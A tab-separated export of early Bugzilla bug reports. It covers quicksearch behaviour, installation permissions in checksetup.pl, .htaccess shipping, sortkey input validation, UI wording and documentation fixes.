Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
76073%TAB%987275456%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%quicksearch: + prefix doesn't work,quicksearch: + prefix doesn't work in IE or opera,quicksearch: + and - prefixes doesn't work in IE or opera%TAB%quicksearch: + prefix doesn't work,quicksearch: + prefix doesn't work in IE or opera,quicksearch: + and - prefixes doesn't work in IE or opera+ is ignored as a quicksearch prefix ("+foo" searches for bugs with "+foo" in  product, summary, etc).  According to the documentation, it's supposed to  search in only the summary field.  Btw, the documentation gives an example of "+brow  does not find all bugs in  the  Browser  product".  This is confusing, because the example says what  doesn't happen without saying what does happen.  I think the example should be  replaced with 'For example, use "+news" to find bugs with "news" in the summary  without also finding all bugs in the MailNews product'.)
76154%TAB%987398747%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%.htaccess files%TAB%.htaccess filesFor Bugzilla 2.12 we documented the files that admins have to deny access to.  For 2.14 we should ship .htaccess files for web servers that support them (just Apache?)  This should probably be one of the last bugs we complete before shipping 2.14.   There's other bugs pending which will change the definitions of what needs to be  blocked.  (shadow/ is gone, data/comments no longer needs to be accessible by the  webserver, etc)
76156%TAB%987399362%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Securing Bugzilla section omits shadow directory.%TAB%Securing Bugzilla section omits shadow directory.While the Securing Bugzilla section does talk about securing the shadow directory, it is missing in this sentence:  Ensure you have adequate access controls for $BUGZILLA_HOME/data/ and $BUGZILLA_HOME/localconfig. The localconfig file stores your "bugs" user password, which would be terrible to have in the hands of a criminal. Also some files under $BUGZILLA_HOME/data store sensitive information.
76157%TAB%987400384%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Give proper error message on non-numeric sortkey.%TAB%Give proper error message on non-numeric sortkey.If I try to add or edit a milestone such that the sortkey is not a number, I get an error like:  INSERT INTO milestones ( value, product, sortkey ) VALUES ( 'A','TestProduct', K): Unknown column 'K' in 'field list' at globals.pl line 173.   This should check the sortkey is a number and give a reasonable error message if not.  This might be a security problem but I can't figure out how to might make it one.
76161%TAB%987401627%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Don't marking resolving duplicate when exiting empty dupe field.,Don't select "resolve as dup" radio button when exiting empty dupe field.%TAB%Don't marking resolving duplicate when exiting empty dupe field.,Don't select "resolve as dup" radio button when exiting empty dupe field.There is currently code so that when I exit the "Resolve this bug as dupe of [    ] field", the radio button for this line gets checked.  I unchecked it, and then when back and removed the number just to be sure.  Then when I exited it selected the line again.  It should only do this when there is something in the field.
76183%TAB%987407163%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl updates data permissions in two places.%TAB%checksetup.pl updates data permissions in two places.There are two places on checksetup.pl where permissions are updated for data.  The first only occurs when creating data:  unless (-d 'data') {     print "Creating data directory ...\n";     mkdir 'data', 0770;     if ($my_webservergroup eq "") {         chmod 0777, 'data';     }     open FILE, '>>data/comments'; close FILE;     open FILE, '>>data/nomail'; close FILE;     open FILE, '>>data/mail'; close FILE;     chmod 0666, glob('data/*'); }  and the second one occurs later, when the web server group is defined:      chmod 0770, 'data', 'shadow', 'graphs';     chmod 0666, glob('data/*');     chmod 0777, glob('data/*/'); # directories stay executable  Why not reconcile these?  The first bit should just create the directory, and the second bit should set up the permissions whether or not the web server group is set (in the way data is set in the first bit).  Also, there is also similar code for creating graphs, but it is even further down when I think it should be above the second code bit above and maybe near the first code bit:  unless (-d 'graphs') {     print "Creating graphs directory...\n";     mkdir 'graphs', 0770;      if ($my_webservergroup eq "") {         chmod 0777, 'graphs';     }       ...  If it is important that graphs be after certain things above it, perhaps permissions should be the last thing done.
76261%TAB%987436659%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl should set sticky bit set on /opt/webtools/bugzilla/graph,checksetup.pl should set sticky bit on ${BZ_HOME}/graphs%TAB%checksetup.pl should set sticky bit set on /opt/webtools/bugzilla/graph,checksetup.pl should set sticky bit on ${BZ_HOME}/graphsChart::Base in perl 5.6 requires sticky bit set on /opt/webtools/bugzilla/graph because the directory is world writable.  reports.cgi doesn't work with perl 5.6 because of this problem and throws some odd looking errors that don't seem to have anything to do with  directory permissions.  to work around the problem do this: chmod 1777 /opt/webtools/bugzilla/graph
76484%TAB%987574214%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Allow multiple QuickSearch forms in a single document%TAB%Allow multiple QuickSearch forms in a single documentThe QuickSearch documentation should be able to present examples the same way Google does, so that the user can modify them and/or submit them directly from the documentation page. See http://www.google.com/help/basics.html and http://www.google.com/help/refinesearch.html for example pages.  For this to work, it must be possible to have multiple QuickSearch forms in a single document. This is currently impossible because the functions in quicksearch.js don't take any arguments, they read the value from a hardcoded location instead (document.f.id.value or something like this). This has to be changed so that  	a) the value or	b) the textbox form element or	c) the form itself  is passed as an argument to the JS function. - a) and b) are very similar; the only difference is that  - An advantage of c) is that the interface would not need to be changed in case QuickSearch is extended by additional, optional form elements (radio buttons, checkboxes, ...), so that quicksearch.js could support these new elements but still be backwards compatible. - A disadvantage of c) is that name="id" for the textbox would still have to be hardcoded.  Feel free to take this one if you like. Currently I have no time, but maybe in two weeks...
76507%TAB%987580561%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%Assignee or owner?%TAB%Assignee or owner?I commented on the fact that Tara is called the Bugzilla "owner" on the web page and asked just what an owner of a piece of software is meant to be.  I thought it was trying to get at "project leader" but Dave said it was more like "default assignee for the Bugzilla component", which had never occurred to me.  It was not suprising to me therefore that the bug page uses the wording "assignee".  However, inconsistently "owner" appears on editcomponents.cgi on the components table (editcomponents.cgi?product=XXX) and on the specific component form (editcomponents.cgi?product=XXX&component=YYY&action=edit).  I'm not concerned with the schema, and I'm not sure about any other pages.  So basically, we should make this consistent.  I suggest assignee is a better term since it is less ambiguous, at least when used outside the context of Bugzilla like it was on the web page.
76524%TAB%987588642%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%mostfreqhtml fix.%TAB%mostfreqhtml fix.I changed the query page link to be relative so it would work for other installations.  And I also fixed the Bugzilla Helper link which was broken.  As much as I dislike leaving that line in because it is b.m.o specific, it looks like editparams is too infested with them to deal with them easily.
76639%TAB%987638129%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Installation%TAB%Maintainer should be automatically set.%TAB%Maintainer should be automatically set.The maintainer field on editparams.cgi should be set by checksetup.pl from the email account of the first account created by it.  This will be a nice trick, since checksetup.pl has no access to the Params unless  we duplicate a whole mess of code.  I agree it's a good idea though.  Hmm, on second thought, assuming that data/params doesn't exist yet, a very  simplified data/params could probably be written out that contained only the  maintainer param.  The rest of the params would be picked up from defparams.pl  the next time it tries to reference a param that hasn't been defined yet.
76714%TAB%987675187%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%incorrectly nested FORM and TABLE tags in command menu%TAB%incorrectly nested FORM and TABLE tags in command menuThe command menu that appears at the bottom of most Bugzilla pages contains incorrectly nested </form> and </table> tags as well as extraneous <tr> and </tr> tags.  This bug may cause form data to be lost when returning to a cached Bugzilla page (bug 74639).
76837%TAB%987727126%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%queryhelp.cgi is b.m.o specific.%TAB%queryhelp.cgi is b.m.o specific.Currently queryhelp.cgi contains numerous references to the bugzilla.mozilla.org installation.  I don't think we should release it as is.
76862%TAB%987751015%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%mysqlwatcher.pl is not executable.%TAB%mysqlwatcher.pl is not executable.mysqldwatcher.pl should be added to the executable files in checksetup.pl, or moved to contrib.
76923%TAB%987770542%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Don't do diagnostics and warnings unless wanted,Don't |use diagnostics;|%TAB%Don't do diagnostics and warnings unless wanted,Don't |use diagnostics;|This gives us at least a 5% speedup on show_bug.cgi! Modperl is all good and fine (note that the patch doesn't quite work yet...),  but it requires lots of work to set it up on the installation end. I would rather  try to eerk out all the proformence I can from the actual perl scripts (where  we spend 10% of the time in show_bug.cgi doing warnings and  diagnostics) than going through gross hacks that most people won't take  the time and effort to use. If you are interested in working on this, you are  welcome to file a bug assigned to you that blocks the meta 
77107%TAB%987934179%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Documentation%TAB%Docs should refer to our bug writing guidelines.,Docs should include our bug writing guidelines.%TAB%Docs should refer to our bug writing guidelines.,Docs should include our bug writing guidelines.In the section 4.3.3.1. Writing a Great Bug Report, it refers to the mozilla.org bug writing guidelines.  However, we already ship with a set of bug writing guidelines.  We should refer to that instead.
